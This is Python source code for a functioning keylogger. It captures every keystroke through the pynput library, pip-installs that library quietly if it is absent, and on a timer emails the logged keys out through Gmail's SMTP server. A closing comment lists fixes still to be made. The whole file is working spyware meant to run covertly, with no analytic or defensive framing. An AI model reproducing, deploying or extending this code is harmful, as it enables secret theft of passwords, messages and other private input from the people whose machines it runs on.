try:
    import sys
    import smtplib
    import threading
    import pynput.keyboard as keyboard
    import subprocess
except:
    if sys.platform in ['win32','cygwin']:
        subprocess.check_output("python -m pip install --upgrade pip", shell=True)
        subprocess.check_output("python -m pip install pynput", shell=True)
    else:
        subprocess.check_output("pip install --upgrade pip", shell=True)
        subprocess.check_output("pip install pynput", shell=True)

class Keylogger:
    def __init__(self, interval, email, password, subject):
        self.logs = "Keylogger Script Started"
        self.logs_list = []
        self.interval = interval
        self.email = email
        self.password = password
        self.subject = subject
    
    def append_to_log(self, string):
        self.logs = self.logs + string

    def process_key_strike(self, key):
        key=str(key) # convert the key type into string
        if key[0] in ["'", "<"]: key = key[1:-1] # remove the single quotes and angle brackets of str key
        try: # for right calc values the key press nnumbers are 96 and above,
            temp = int(key) # try to convert them to normal 1 and 2 and append them
            if temp >= 96:
                key = str(temp-96)
        except: # if that is not the case then continue the execution
            pass
        self.logs_list.append(key) # append all the keys to the log global variable
        current_key = ""
        if "Key." in key:
            if key == "Key.space":
                current_key = " "
            else:
                current_key = " " + key + " "
        else:
            current_key = key
        self.append_to_log(current_key)

    def report(self):
        print("printing Logs")
        print(self.logs_list)
        print(self.logs)
        msg = {
            "list_output" : self.logs_list,
            "string_output" : self.logs
        }
        self.send_Mail(self.email, self.password, msg, self.subject)
        self.logs_list = []
        self.logs = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()
    
    def send_Mail(self, email, password, msg, subject):
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(email, password)
            body = f'''
                Logs (string output)
                    {msg['string_output']}

                =======================================================
                
                Logs: (list output)
                    {msg['list_output']}
                '''
            msg = "Subject: {}\n\n{}".format(subject, body)
            server.sendmail(email, email, msg) # arguments are from_email, to_email, msg
            server.quit()
        except Exception as error:
            print("Exception occured while sending mails")
            print(error)
            sys.exit()

    def start(self):
        key_strikes = keyboard.Listener(on_press=self.process_key_strike)
        print("[=] startting the program")
        with key_strikes:
            self.report()
            key_strikes.join()


'''
if the key press value is more than 95 then match the values with the calculator keyboard
on the right side
96-0, 97-1, 98-2, 99-3, 100-4, 101-5, 102-6, 103-7, 104-8, 105-9

one more thing to fix is that whn pressed ctrl + anything its getting some hex digits -> map the releated hex output to key logs

'''